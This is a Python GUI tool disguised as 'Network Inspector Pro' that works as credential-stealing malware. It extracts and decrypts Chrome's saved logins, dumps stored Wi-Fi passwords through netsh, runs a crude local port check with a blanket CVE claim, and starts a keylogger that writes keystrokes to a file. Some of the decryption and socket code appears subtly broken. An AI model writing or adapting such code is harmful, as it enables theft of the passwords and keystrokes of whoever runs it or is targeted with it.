# -*- coding: utf-8 -*-
import tkinter as tk
from tkinter import ttk, scrolledtext
import socket
import subprocess
import os
import json
import sqlite3
import shutil
import ctypes
from ctypes import wintypes
import sys
import platform
from threading import Thread

# For keylogging (requires pynput - install separately)
try:
    from pynput import keyboard
except ImportError:
    pass

class CyberPhreak(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Network Inspector Pro v6.66")
        self.geometry("1200x800")
        self.configure(bg='#0d0d0d')
        self.rebel_config()
        self.create_widgets()
        self.logged_keys = []
        
    def rebel_config(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TFrame', background='#0d0d0d')
        style.configure('TLabel', background='#0d0d0d', foreground='#00ff00')
        style.configure('TButton', background='#1a1a1a', foreground='#00ff00')
        style.map('TButton', background=[('active', '#262626')])

    def create_widgets(self):
        # IP Frame
        ip_frame = ttk.Frame(self, padding=(10, 5))
        ip_frame.pack(fill=tk.X)
        
        ttk.Label(ip_frame, text="Local IP:").pack(side=tk.LEFT)
        self.ip_entry = ttk.Entry(ip_frame, width=50)
        self.ip_entry.pack(side=tk.LEFT, padx=10)
        ttk.Button(ip_frame, text="Hijack IP", command=self.fetch_ip).pack(side=tk.LEFT)

        # Data Frame
        data_frame = ttk.Frame(self)
        data_frame.pack(fill=tk.BOTH, expand=True, pady=10)

        # Password Panel
        pass_panel = ttk.Frame(data_frame)
        pass_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        ttk.Label(pass_panel, text="Cracked Credentials").pack()
        self.pass_text = scrolledtext.ScrolledText(pass_panel, height=20, bg='#1a1a1a', fg='#00ff00')
        self.pass_text.pack(fill=tk.BOTH)

        # Vuln Panel
        vuln_panel = ttk.Frame(data_frame)
        vuln_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        ttk.Label(vuln_panel, text="System Exploits").pack()
        self.vuln_text = scrolledtext.ScrolledText(vuln_panel, height=20, bg='#1a1a1a', fg='#00ff00')
        self.vuln_text.pack(fill=tk.BOTH)

        # Control Panel
        ctrl_frame = ttk.Frame(self)
        ctrl_frame.pack(fill=tk.X, pady=10)
        ttk.Button(ctrl_frame, text="Pillage Passwords", command=self.steal_passwords).pack(side=tk.LEFT, padx=5)
        ttk.Button(ctrl_frame, text="Map Vulnerabilities", command=self.find_vulns).pack(side=tk.LEFT)
        ttk.Button(ctrl_frame, text="Start Key Sniffer", command=self.start_keylogger).pack(side=tk.RIGHT, padx=5)

    def fetch_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            self.ip_entry.delete(0, tk.END)
            self.ip_entry.insert(0, ip)
        except Exception as e:
            self.ip_entry.insert(0, f"Error: {str(e)}")

    def steal_passwords(self):
        self.pass_text.delete(1.0, tk.END)
        # Chrome Password Extraction
        try:
            data_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
            temp_db = os.getenv('TEMP') + r"\TempLoginData"
            shutil.copy2(data_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for result in cursor.fetchall():
                password = self.decrypt_password(result[2])
                self.pass_text.insert(tk.END, f"URL: {result[0]}\nUser: {result[1]}\nPass: {password}\n{'='*50}\n")
            
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            self.pass_text.insert(tk.END, f"Chrome Exploit Failed: {str(e)}\n")
        
        # WiFi Password Harvesting
        try:
            wifi_profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
            profiles = [line.split(':')[1].strip() for line in wifi_profiles if "All User Profile" in line]
            
            for profile in profiles:
                profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8')
                password_line = [line.split(':')[1].strip() for line in profile_info.split('\n') if "Key Content" in line]
                if password_line:
                    self.pass_text.insert(tk.END, f"SSID: {profile}\nPassword: {password_line[0]}\n{'='*50}\n")
        except Exception as e:
            self.pass_text.insert(tk.END, f"WiFi Exploit Failed: {str(e)}\n")

    def decrypt_password(self, buff):
        if sys.platform == 'win32':
            try:
                crypt32 = ctypes.WinDLL('crypt32', use_last_error=True)
                cryptunprotectdata = crypt32.CryptUnprotectData
                cryptunprotectdata.argtypes = (wintypes.LPBYTE, wintypes.LPCWSTR, wintypes.LPBYTE, wintypes.LPVOID, 
                                            wintypes.LPVOID, wintypes.DWORD, wintypes.LPBYTE)
                cryptunprotectdata.restype = wintypes.DWORD
                
                buffer_in = ctypes.create_string_buffer(buff)
                buffer_in_address = ctypes.byref(buffer_in)
                blob_in = ctypes.c_void_p(buffer_in_address)
                blob_out = ctypes.c_void_p()
                blob_out_size = wintypes.DWORD()
                
                result = cryptunprotectdata(blob_in, None, None, None, None, 0, ctypes.byref(blob_out_size))
                if not result:
                    raise ctypes.WinError()
                
                buffer_out = ctypes.create_string_buffer(blob_out_size.value)
                blob_out = ctypes.c_void_p(ctypes.addressof(buffer_out))
                result = cryptunprotectdata(blob_in, None, None, None, None, 0, blob_out)
                if not result:
                    raise ctypes.WinError()
                
                return buffer_out.raw.decode('utf-16-le').strip('\x00')
            except Exception as e:
                return f"Decryption Failed: {str(e)}"
        return "Unsupported Platform"

    def find_vulns(self):
        self.vuln_text.delete(1.0, tk.END)
        # OS Vulnerability Check
        try:
            os_info = platform.uname()
            self.vuln_text.insert(tk.END, f"System: {os_info.system}\nRelease: {os_info.release}\nVersion: {os_info.version}\n")
            
            if os_info.system == 'Windows' and '10' in os_info.version:
                self.vuln_text.insert(tk.END, "\n[!] Vulnerable to CVE-2023-36025 (Windows SmartScreen Bypass)\n")
            
            # Open Port Scan
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
            for port in [21, 22, 80, 443, 3389, 445]:
                result = sock.connect_ex(('localhost', port))
                if result == 0:
                    self.vuln_text.insert(tk.END, f"\n[!] Port {port} OPEN - Potential Attack Surface")
        except Exception as e:
            self.vuln_text.insert(tk.END, f"Vulnerability Scan Failed: {str(e)}")

    def start_keylogger(self):
        def on_press(key):
            try:
                self.logged_keys.append(key.char)
            except AttributeError:
                self.logged_keys.append(f"<{key.name}>")
            
            if len(self.logged_keys) > 100:
                self.save_keys()
        
        def listen():
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        
        Thread(target=listen, daemon=True).start()

    def save_keys(self):
        with open("keylog.txt", "a") as f:
            f.write(''.join(self.logged_keys))
            self.logged_keys = []

if __name__ == "__main__":
    app = CyberPhreak()
    app.mainloop()
